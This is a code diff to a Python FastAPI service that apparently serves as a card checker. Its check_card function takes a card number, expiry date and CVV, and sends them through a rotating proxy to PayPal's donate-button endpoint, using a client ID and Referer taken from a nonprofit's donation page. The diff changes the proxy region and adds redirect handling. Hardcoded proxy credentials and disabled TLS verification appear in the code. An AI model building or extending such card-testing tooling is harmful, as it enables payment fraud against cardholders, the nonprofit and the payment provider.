@@ -15,7 +15,7 @@ init(autoreset=True)
 app = FastAPI()
 
 # === CONFIGURACIÓN DESDE .env ===
-PAYPAL_PROXY_URL = os.getenv("PAYPAL_PROXY_URL", "http://qaxtdvtr-US-rotate:cpyp473gyvje@p.webshare.io:80")
+PAYPAL_PROXY_URL = os.getenv("PAYPAL_PROXY_URL", "http://qaxtdvtr-GT-rotate:cpyp473gyvje@p.webshare.io:80")
 PAYPAL_CLIENT_ID = os.getenv("PAYPAL_CLIENT_ID", "Aen29VHHiwicell9lz4gxb-Di_n4xeRY3ZGiwyuQY6m_LQIkNcZ0xydAgPMMnjEzQqMCUnPmgFGcaHfh")
 
 def get_session_id():
@@ -46,8 +46,13 @@ async def check_card(cc: str, mm: str, aa: str, cvv: str):
         "Referer": "https://onehealthworkforceacademies.org/"
     }
 
-    # Iniciamos sesión con el proxy de IPRoyal
-    async with httpx.AsyncClient(proxy=proxy_url, verify=False, timeout=40.0) as session:
+    # Iniciamos sesión con el proxy (con reintentos)
+    async with httpx.AsyncClient(
+        proxy=proxy_url,
+        verify=False,
+        timeout=40.0,
+        follow_redirects=True
+    ) as session:
         try:
             # PASO 1: Obtener Token Facilitador
             url_sdk = f"https://www.paypal.com/smart/buttons?style.label=donate&sdkVersion=5.0.390&clientID={PAYPAL_CLIENT_ID}&env=production&currency=USD&intent=capture"
